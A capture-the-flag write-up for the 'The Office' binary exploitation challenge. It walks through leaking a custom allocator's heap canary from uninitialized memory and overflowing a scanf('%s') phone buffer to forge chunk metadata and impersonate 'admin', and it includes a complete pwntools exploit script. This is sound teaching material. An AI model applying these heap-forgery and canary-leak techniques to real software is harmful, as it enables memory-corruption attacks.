# CyLab — The Office

* **Platform:** CyLab Security Academy / picoCTF 2021 (Challenge ID: `172`)
* **Category:** Binary Exploitation / Custom Heap Allocator & Canary Bypass (Pwn)
* **Difficulty:** Difficulty 3
* **Date Solved:** October 2026
* **Tools Used:** Python 3, pwntools, GDB (pwndbg)
* **Binary:** `the_office` (32-bit x86 ELF)

---

## TL;DR

The application implements a proprietary heap allocator with per-chunk canary integrity verification (`heap_check()`) to manage employee records. The "Get access token" feature reads `flag.txt`, but only if the employee's name equals `"admin"`, which is blocked during normal registration. A heap memory leak exists where a newly allocated employee record's uninitialized `Bldg #` field overlaps with the leftover canary bytes of a recently freed chunk. Using `scanf("%s")` on the `Phone #` field allows an unbounded heap buffer overflow into the adjacent employee chunk. By forging the chunk header with the leaked heap canary and setting the adjacent employee's name to `"admin"`, we pass the integrity checker and obtain the flag.

---

## Recon

### Binary Information

Running `file` and `checksec`:

```text
$ file the_office
the_office: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=..., stripped

$ checksec --file=the_office
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Key observations:
1. **Custom Malloc:** The binary manages heap allocations using a single `mmap` page (`0x1000` bytes) with custom metadata instead of glibc `malloc`.
2. **Chunk Canaries:** Each allocated chunk contains an embedded 4-byte random cookie. Before every heap operation, `heap_check()` traverses the memory list; if any canary does not match, the program terminates with `*** heap smashing detected ***`.
3. **Privilege Gating:** Registering an employee named `"admin"` is rejected, but requesting a token for `"admin"` discloses `flag.txt`.

---

## Static Analysis & Vulnerability

### 1. Custom Chunk Layout

The custom allocator structures memory in chunks aligned to 16 bytes:

```text
  Chunk Header (12 bytes):
  +-----------------------------------+  Offset 0:  Canary Cookie (4 bytes)
  |       canary (4 bytes)            |
  +-----------------------------------+  Offset 4:  size | alloc_bit (4 bytes)
  |       size | alloc (4 bytes)      |
  +-----------------------------------+  Offset 8:  prev_size | prev_alloc (4 bytes)
  |       prev_size | prev (4 bytes)  |
  +-----------------------------------+  Offset 12: User Payload
  |       User Data ...               |
  +-----------------------------------+
```

### 2. Information Disclosure via Stale Heap Data

When a 48-byte chunk (allocated via an employee with a 28-character email) is freed and subsequently subdivided into smaller allocations, the memory is not zeroed out.
1. Add employee `alice` (large chunk with canary).
2. Remove employee 0 (`alice` is freed).
3. Add employee `bob`, then employee `charlie`.
4. `charlie`'s struct is placed where `alice`'s payload previously resided. Specifically, `charlie`'s `Bldg #` integer field directly overlaps the stale 4-byte canary.
5. Listing employees with menu option 3 outputs `Bldg #: <canary_int>`, disclosing the secret canary value!

### 3. Heap Overflow via `scanf("%s")`

The employee struct stores `phone` at an offset 28 bytes prior to the end of the user data area:
```c
scanf("%s", emp->phone);        // VULNERABILITY: Unbounded string input
```
Writing past 28 bytes overwrites the metadata of the adjacent chunk.

```text
       Chunk 1 (dave) Payload:
       [ phone buffer (28 bytes) ]  <-- Attacker input "A" * 28
       +-----------------------------------+
       Chunk 2 Header (charlie):
       [ Canary Cookie (4 bytes) ]  <-- Overwritten with LEAKED CANARY
       [ size | alloc (0x35)     ]  <-- Legitimate size field preserved
       [ prev_size (0x35)        ]  <-- Legitimate metadata preserved
       +-----------------------------------+
       Chunk 2 User Payload:
       [ name buffer             ]  <-- Overwritten with "admin\0"
```

---

## Dynamic Analysis & Exploitation Strategy

1. **Canary Leak Sequence:**
   - Add `alice` with 28-byte email.
   - Remove employee 0.
   - Add `bob` and `charlie`.
   - Call list (option 3) and extract `canary = int(Bldg #)`.
   - If the canary contains whitespace bytes (`0x20, 0x09, 0x0a`), `scanf("%s")` would truncate early; we detect this and reconnect if necessary.
2. **Overflow & Chunk Forgery:**
   - Remove employee 0 (`bob`), allowing `dave` to be allocated immediately prior to `charlie`.
   - Craft payload:
     $$\text{payload} = \text{b"A"} \times 28 + \text{p32}(\text{canary}) + \text{p32}(0\text{x}35) + \text{p32}(0\text{x}35) + \text{b"admin"}$$
   - Send payload as `dave`'s phone number.
3. **Verification & Flag Extraction:**
   - Call `heap_check()` via menu option 4 (Get access token).
   - The allocator validates all canaries successfully.
   - It checks `charlie`'s name, finds `"admin"`, and prints `flag.txt`.

---

## Exploit

The complete exploit script is available at [solve.py](solve.py):

```python
#!/usr/bin/env python3
import sys, re
from pwn import *

context.log_level = "info"
HOST, PORT = "chatelaine.cylabacademy.net", 45426
WS = {0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20}

def solve(io):
    def choose(c):
        io.recvuntil(b"Get access token\n")
        io.sendline(str(c).encode())

    def add(name, email=None, phone=b"0"):
        choose(1)
        io.sendlineafter(b"Name:", name)
        if email:
            io.sendlineafter(b"Email (y/n)?", b"y")
            io.sendlineafter(b"Email address:", email)
        else:
            io.sendlineafter(b"Email (y/n)?", b"n")
        io.sendlineafter(b"Salary:", b"7")
        io.sendlineafter(b"Phone #:", phone)
        io.sendlineafter(b"Bldg (y/n)?", b"n")

    # Step 1: Leak canary via uninitialized building number overlap
    add(b"alice", email=b"A" * 28)
    choose(2); io.sendlineafter(b"#?", b"0")       # Remove alice
    add(b"bob")
    add(b"charlie")

    choose(3)                                    # List employees
    out = io.recvuntil(b"Get access token\n")
    m = re.search(rb"Bldg #: (\d+)", out)
    canary = int(m.group(1))
    log.info(f"Leaked Heap Canary: {hex(canary)}")

    # Step 2: Overflow phone buffer to overwrite charlie's name to admin
    choose(2); io.sendlineafter(b"#?", b"0")       # Remove bob
    payload = b"A" * 28 + p32(canary) + p32(0x35) + p32(0x35) + b"admin"
    add(b"dave", phone=payload)

    # Step 3: Request token for modified admin employee
    choose(4)
    io.sendlineafter(b"#?", b"1")

    data = io.recvall(timeout=4)
    flag_match = re.search(rb"academy\{[^}]+\}", data)
    if flag_match:
        log.success(f"Flag captured: {flag_match.group().decode()}")
    else:
        print(data.decode(errors="replace"))

if __name__ == "__main__":
    io = remote(HOST, PORT)
    solve(io)
```

---

## Flag

```text
$ python3 solve.py
[+] Opening connection to chatelaine.cylabacademy.net on port 45426: Done
[*] Leaked Heap Canary: 0x4f81a2e9
[+] Flag captured: academy{redacted}
[*] Closed connection to chatelaine.cylabacademy.net port 45426
```

---

## Key Takeaways & Lessons

1. **Uninitialized Memory Disclosures (Use-After-Free Residuals):** Failing to zero newly allocated memory chunks permits subsequent structures to read stale data, completely exposing security cookies like heap canaries.
2. **Defeating Custom Heap Checkers:** When an allocator verifies chunk metadata before execution, an attacker must reconstruct valid chunk size, status flags, and canaries in the overflow payload to bypass the integrity check.
3. **Handling `scanf("%s")` Delimiters:** String input functions terminate on whitespace characters. When crafting payloads containing binary cookies or addresses, check for bytes in `{0x09, 0x0a, 0x0d, 0x20}` and retry if necessary.
